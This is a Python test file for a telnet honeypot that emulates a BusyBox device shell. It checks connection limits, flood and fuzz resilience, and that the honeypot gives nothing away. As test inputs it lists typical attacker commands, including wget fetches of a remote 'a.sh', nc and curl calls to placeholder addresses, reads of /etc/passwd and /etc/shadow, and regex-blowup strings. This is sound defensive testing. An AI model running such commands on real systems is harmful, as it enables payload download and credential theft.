"""Caps, timeouts, floods, fuzzing and the "no giveaways" checks."""

from __future__ import annotations

import asyncio
import random
import resource
import time

import pytest

from telnet_sensor.watchdog import LoopWatchdog


async def _eof(client, timeout: float = 3.0) -> bytes:  # type: ignore[no-untyped-def]
    try:
        data = await client.read_all(timeout)
    except (ConnectionError, OSError):  # closing with unread input from a flooder resets
        return b""
    return bytes(data[client.pos :])


# ---- connection caps and timeouts ------------------------------------------------------------
async def test_per_ip_and_global_caps(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=2) as h:
        a, b = await h.connect(), await h.connect()
        await a.until(b"login: ")
        await b.until(b"login: ")
        c = await h.connect()
        assert await _eof(c) == b""  # closed without a banner
        await a.close()
        await asyncio.sleep(0.2)
        d = await h.connect()
        await d.until(b"login: ")
        assert h.sensor.stats()["rejected"] == 1
    async with make_harness(max_connections=1, max_per_ip=5) as h:
        a = await h.connect()
        await a.until(b"login: ")
        assert await _eof(await h.connect()) == b""


async def test_new_connection_rate_per_ip(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(conn_rate_per_ip=0.01, conn_burst_per_ip=3.0) as h:
        served = 0
        for _ in range(6):
            c = await h.connect()
            try:
                await c.until(b"login: ", 0.5)
                served += 1
            except (EOFError, TimeoutError):
                pass
            await c.close()
        assert served == 3 and h.sensor.rate_rejected == 3


async def test_login_timeout_message(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(login_timeout=1.0) as h:
        c = await h.connect()
        await c.until(b"login: ")
        tail = await _eof(c, 4.0)
        assert b"Login timed out after 60 seconds." in tail
        (disc,) = await h.events("disconnect") or [None]
        assert disc is None  # never sent anything: summarised, not reported


async def test_slow_drip_cannot_hold_the_login(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(login_timeout=1.0, idle_timeout=30.0) as h:
        c = await h.connect()
        start = time.monotonic()
        try:
            async with asyncio.timeout(5):
                while True:
                    await c.send("r")
                    await asyncio.sleep(0.2)
        except (ConnectionError, OSError, TimeoutError):
            pass
        assert time.monotonic() - start < 3.5
        assert h.sensor.stats()["connections"] == 0


async def test_idle_and_session_limits(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(idle_timeout=0.5) as h:
        c = await h.logged_in()
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "idle timeout"
    async with make_harness(max_session=1.0, idle_timeout=30.0) as h:
        c = await h.logged_in()
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "session time limit"


async def test_input_volume_limit(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_input_bytes=20_000) as h:
        c = await h.connect()
        await c.until(b"login: ")
        try:
            for _ in range(100):
                await c.send(b"\xff\xfb\x18" * 300)
                await asyncio.sleep(0)
        except (ConnectionError, OSError):
            pass
        await _eof(c)
        assert h.sensor.stats()["connections"] == 0


async def test_huge_line_is_capped_not_buffered(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_line=512) as h:
        c = await h.logged_in()
        await c.send(b"A" * 100_000)
        await asyncio.sleep(0.3)
        conn = next(iter(h.sensor.connections))
        assert len(conn.editor._buf) <= 512 and len(conn.editor._pending) <= 1024
        await c.send("\r\n")
        out = await c.until(b" # ")
        assert b"not found" in out and out.count(b"A") <= 1100  # echo is capped too


async def test_command_and_output_limits(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_commands=5) as h:
        c = await h.logged_in()
        for _ in range(5):
            await c.run("true")
        await c.send("true\r\n")
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "command limit"
    async with make_harness(max_session_output=4000) as h:
        c = await h.logged_in()
        try:
            for _ in range(30):
                await c.send("cat /proc/cpuinfo\r\n")
                await asyncio.sleep(0.02)
        except (ConnectionError, OSError):
            pass
        await _eof(c)
        assert (await h.events("disconnect"))[0].data["reason"] == "output limit"


async def test_client_that_never_reads_is_dropped(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(write_timeout=0.5, max_session_output=10**9, max_commands=10**6) as h:
        c = await h.logged_in()
        await c.run("echo " + "x" * 3000 + " > f; cat f f f f f f f f f f f f f f f f f f f f > g")
        await c.run("cat g g g g g g g g g g g g g g g g g g g g > f")
        # now stop reading and ask for ~64 KiB of output many times
        sock = c.writer.get_extra_info("socket")
        sock.setsockopt(__import__("socket").SOL_SOCKET, __import__("socket").SO_RCVBUF, 2048)
        c.writer.write(b"cat f f f f f f f f f f f f f f f f f f f f\r\n" * 400)
        deadline = time.monotonic() + 15
        while h.sensor.stats()["connections"] and time.monotonic() < deadline:
            try:
                await asyncio.wait_for(c.writer.drain(), 0.2)
            except (TimeoutError, ConnectionError, OSError):
                pass
            await asyncio.sleep(0.1)
        assert h.sensor.stats()["connections"] == 0
        reasons = [e.data["reason"] for e in await h.events("disconnect")]
        assert reasons and reasons[0] in ("write timeout", "output limit", "connection lost")


# ---- event limits --------------------------------------------------------------------------------
async def test_event_quota_and_suppression_summary(make_harness) -> None:  # type: ignore[no-untyped-def]
    limits = {"valuable_rate": 1.0, "valuable_burst": 30.0}
    async with make_harness(sink_limits=limits) as h:
        c = await h.logged_in()
        await c.send("true\r\n" * 200)
        await c.send("exit\r\n")
        await c.read_all()
        events = await h.events()
        cmds = [e for e in events if e.type == "command"]
        assert 25 <= len(cmds) <= 40
        disc = events[-1]
        assert disc.type == "disconnect" and disc.data["commands"] == 201
        assert disc.data["events_suppressed"] >= 150
        assert any(e.data.get("kind") == "events_suppressed" for e in events if e.type == "scan")
        assert [e for e in events if e.type == "login_attempt"]  # the login was never starved


# ---- floods and fuzzing -----------------------------------------------------------------------------
async def test_connection_flood_is_survivable(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness(max_per_ip=8, max_connections=50) as h:
        before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

        async def one() -> None:
            try:
                r, w = await asyncio.open_connection("127.0.0.1", h.port)
                w.write(bytes([255, 251, 24]) * 20 + b"root\r\nroot\r\n")
                await w.drain()
                await asyncio.wait_for(r.read(64), 1)
                w.close()
            except (ConnectionError, OSError, TimeoutError):
                pass

        await asyncio.gather(*(one() for _ in range(300)))
        await asyncio.sleep(0.3)
        assert h.sensor.stats()["connections"] == 0
        assert h.sensor.stats()["rejected"] > 0
        assert resource.getrusage(resource.RUSAGE_SELF).ru_maxrss - before < 80_000  # < 80 MB
        c = await h.logged_in()  # still serving
        assert await c.run("echo alive") == "alive"


async def test_negotiation_fuzz_over_the_wire(make_harness) -> None:  # type: ignore[no-untyped-def]
    rng = random.Random(1234)
    async with make_harness() as h:
        start = time.monotonic()
        for _ in range(40):
            r, w = await asyncio.open_connection("127.0.0.1", h.port)
            blob = bytes(
                rng.choice((255, 250, 240, 251, 252, 253, 254, 0, 1, 24, 31, 13, 10, 65, 3, 4, 27))
                for _ in range(rng.choice((10, 500, 4000)))
            )
            w.write(blob)
            await w.drain()
            await asyncio.sleep(0.01)
            w.close()
        assert time.monotonic() - start < 20
        await asyncio.sleep(0.5)
        assert h.sensor.stats()["connections"] == 0
        c = await h.logged_in()
        assert await c.run("echo still-fine") == "still-fine"


async def test_failures_are_contained(make_harness, monkeypatch) -> None:  # type: ignore[no-untyped-def]
    from telnet_sensor.devshell import DeviceShell

    async with make_harness() as h:
        c = await h.logged_in()

        def boom(self, line):  # type: ignore[no-untyped-def]
            raise RuntimeError("emulation bug")

        monkeypatch.setattr(DeviceShell, "run_line", boom)
        await c.send("uname\r\n")
        await c.until(b" # ")  # the session carries on, no traceback on the wire
        assert b"Traceback" not in c.raw and b"RuntimeError" not in c.raw
        cmd = (await h.events("command"))[-1]
        assert cmd.data["input"] == "uname"
    async with make_harness() as h:
        monkeypatch.setattr(h.sensor, "credentials_ok", lambda *a: 1 / 0)
        c = await h.connect()
        await c.until(b"login: ")
        await c.send("root\r\nroot\r\n")
        await _eof(c)  # clean close, not a reset
        disc = (await h.events("disconnect"))[0]
        assert disc.data["reason"] == "internal error"


# ---- the shell under pathological input -------------------------------------------------------------------
@pytest.mark.parametrize(
    "line",
    [
        "awk '{print" + " " * 60_000 + "' /etc/hostname",
        "sed 's/" + " " * 60_000 + "/x/g' /etc/passwd",
        "grep '" + "a*" * 30_000 + "b' /etc/passwd",
        "grep -E '" + "(a+)+" * 10_000 + "$' /etc/passwd",
        "grep '" + ".*" * 30_000 + "x' /proc/cpuinfo",
        "echo " + "a" * 60_000 + " | cut -d ' ' -f1",
        "cat /proc/cpuinfo | sort | uniq -c | tr a-z A-Z | head -5",
        "wget " + ":" * 60_000,
        "tftp -g -r " + "9" * 60_000 + " 192.0.2.1",
        "busybox " + "x" * 60_000,
        "echo " + "$(" * 2000,
        "echo " + "`" * 5000,
        "x=" + "a" * 60_000 + "; echo $x | wc -c",
        "kill " + "9" * 60_000,
        "ping -c " + "9" * 60_000 + " 192.0.2.1",
        ">" + "a" * 60_000,
        "sleep " + "9" * 60_000,
    ],
)
def test_attacker_input_is_cheap(make_shell, line: str) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    start = time.perf_counter()
    sh.run_line(line)
    assert time.perf_counter() - start < 0.5


def test_no_giveaways_in_any_output(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    lines = [
        "env",
        "set",
        "id",
        "uname -a",
        "cat /proc/version",
        "cat /proc/cpuinfo",
        "cat /proc/mounts",
        "cat /etc/passwd",
        "cat /etc/issue",
        "cat /etc/hosts",
        "ls -la /",
        "ls -la /bin",
        "ps",
        "ifconfig",
        "netstat -an",
        "free",
        "df",
        "mount",
        "dmesg",
        "busybox",
        "help",
        "which wget",
        "wget http://198.51.100.1/a.sh",
        "wget https://198.51.100.1/a",
        "tftp",
        "ftpget",
        "ping -c 2 192.0.2.5",
        "nc 192.0.2.5 80",
        "curl http://198.51.100.1/",
        "sudo id",
        "apt update",
        "python3 -V",
        "bash",
        "systemctl",
        "ssh root@192.0.2.1",
        "foo | bar",
        "echo $SHELL $0 $BASH_VERSION $SSH_CONNECTION",
        "history",
        "ls /home /var /etc /mnt",
        "cat /etc/os-release",
        "lscpu",
        "uptime",
        "w",
        "who",
        "last",
        "crontab -l",
    ]
    banned = (
        "ubuntu",
        "honeypot",
        "suckerpot",
        "asyncssh",
        "asyncio",
        "python",
        "x86",
        "amd64",
        "systemd",
        "ssh_",
        "SSH_",
        "bash",
        "debian",
        "gnu c",
        "docker",
        "container",
    )
    outputs = []
    for line in lines:
        text = sh.run_line(line).output
        # "sh: <name>: not found" legitimately repeats the command name the attacker typed
        outputs.append("\n".join(x for x in text.splitlines() if not x.endswith(": not found")))
    blob = "\n".join(outputs).lower()
    for word in banned:
        if word.lower() in blob:
            context = blob[max(0, blob.index(word.lower()) - 80) : blob.index(word.lower()) + 80]
            raise AssertionError(f"{word!r} visible: {context!r}")
    assert "test-seed" not in blob and "shell-seed" not in blob


def test_attacker_commands_are_not_executed(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    out = sh.run_line("sh -c 'id; echo $((1+1))'; $(uname -n); `whoami`; eval 'echo hi'").output
    assert "uid=0(root)" in out
    out = sh.run_line("cat /etc/shadow | head -1").output
    assert out.startswith("root:$1$")
    # the real host is invisible: no /proc of the container, no real hostname
    assert sh.run_line("hostname").output == "dvr-test\n"
    assert "No such file" in sh.run_line("cat /app/telnet_sensor/server.py").output


def test_shell_identity_is_stable_and_seeded(make_shell) -> None:  # type: ignore[no-untyped-def]
    a = make_shell().run_line("ifconfig").output
    assert a == make_shell().run_line("ifconfig").output
    assert "192.168." in a and "HWaddr 00:12:16:" in a
    assert "192.0.2." not in a and "198.51.100." not in a and "203.0.113." not in a


# ---- watchdog -----------------------------------------------------------------------------------------------
async def test_watchdog_fires_on_a_stalled_loop() -> None:
    fired: list[float] = []
    wd = LoopWatchdog(limit=0.5, interval=0.1, on_stall=fired.append)
    wd.start()
    await asyncio.sleep(0.3)
    assert fired == []
    time.sleep(1.0)  # blocks the loop on purpose
    await asyncio.sleep(0.3)
    wd.stop()
    assert fired and fired[0] > 0.5


async def test_pipelined_heavy_lines_do_not_stall_the_loop(make_harness) -> None:  # type: ignore[no-untyped-def]
    """Regression: N logged-in sessions pipelining heavy lines used to starve the event loop."""
    async with make_harness(max_per_ip=10, idle_timeout=60.0, max_session=60.0) as h:
        clients = [await h.logged_in() for _ in range(6)]
        setup = "cd /tmp\nprintf '" + "a" * 126 + "\\n' > b\n" + "cat b b >> c; cat c >> b\n" * 11
        for c in clients:
            await c.send(setup.replace("\n", "\r\n"))
        await asyncio.sleep(1.5)
        line = "sed s/a/bb/g b|sed s/b/cc/g|sed s/c/dd/g|wc -c\r\n"
        for c in clients:
            await c.send(line * 40)
        worst = 0.0
        end = time.monotonic() + 5
        while time.monotonic() < end:
            t = time.monotonic()
            await asyncio.sleep(0.05)
            worst = max(worst, time.monotonic() - t - 0.05)
        assert worst < 1.0, f"event loop lagged {worst:.2f}s"
        # the shell CPU budget made the sessions wait instead of the loop
        assert h.sensor._cpu < h.cfg.shell_cpu_burst


async def test_memory_pressure_keeps_sessions(make_harness) -> None:  # type: ignore[no-untyped-def]
    async with make_harness() as h:
        a = await h.logged_in()
        b = await h.logged_in()
        h.sensor.over_budget = lambda: True
        assert await a.run("echo hi") == "sh: can't fork: Cannot allocate memory"
        assert h.sensor.stats()["connections"] == 2
        h.sensor.over_budget = lambda: False
        assert await b.run("echo hi") == "hi"
        cmd = (await h.events("command"))[0]
        assert cmd.data["status"] == 12


def test_shadow_is_seeded_and_dollar_dollar_matches_ps(make_shell) -> None:  # type: ignore[no-untyped-def]
    sh = make_shell()
    shadow = sh.run_line("cat /etc/shadow").output
    assert (
        "9jZ1uBlP" not in shadow
        and shadow.startswith("root:$1$")
        and len(shadow.split(":")[1]) == 34
    )
    other = make_shell()
    other.profile = type(sh.profile)(**{**sh.profile.__dict__, "seed": "another"})
    assert sh.run_line("echo $$").output.strip() in sh.run_line("ps").output
